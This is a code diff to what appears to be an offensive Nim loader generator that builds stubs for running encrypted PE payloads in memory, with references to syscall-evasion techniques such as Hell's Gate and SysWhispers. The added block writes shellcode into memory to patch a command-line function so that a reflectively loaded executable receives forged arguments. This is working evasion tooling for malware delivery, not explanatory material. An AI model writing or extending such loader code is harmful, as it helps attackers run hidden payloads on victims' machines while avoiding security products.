@@ -481,7 +481,25 @@ writeFile("enc.blob", content)
 let encodedIV = encode(iv)
 let encodedenvkey = encode(envkey)
 
-
+let PatchargsFuncs = fmt"""
+var arguments: string = "{arguments}"
+when defined(args):
+    proc patchMemory*(targetAddr: pointer, data: openArray[byte]): void =
+        var oldProtect: DWORD
+        success =  MyVirtualProtect(targetAddr, cast[SIZE_T](len(data)), PAGE_READWRITE, cast[PDWORD](addr(oldProtect)))
+        copyMem(targetAddr, unsafeAddr data[0], len(data))
+        success = MyVirtualProtect(targetAddr, cast[SIZE_T](len(data)), oldProtect, cast[PDWORD](addr(oldProtect)))
+when defined(args):
+    proc patchArgFunctionMemory*(funcAddr: pointer, pNewCommandLine: pointer): void =
+        when defined x86:
+            var shellcode: seq[byte] = @[byte(0xb8)] # movabs rax, new_cmd
+        else:
+            var shellcode: seq[byte] = @[byte(0x48), byte(0xb8)] # movabs rax, new_cmd
+        for t in cast[array[sizeOf(pointer), byte]](pNewCommandLine):
+            shellcode.add t        
+        shellcode.add(byte(0xc3)) # ret
+        patchMemory(funcAddr, shellcode)
+"""
 let RemoteProcImportStub = """
 import osproc
 """
@@ -975,6 +993,7 @@ if (peload):
             stub.add(HellsPELoadStub)
         elif(getfreshstub):
             stub.add(NtAllocateVirtualMemoryDelegate)
+            stub.add(PatchargsFuncs)
             stub.add(ProtectWriteAllocSyscalls)
             stub.add(PELoadStub)
         elif(syswhispers):
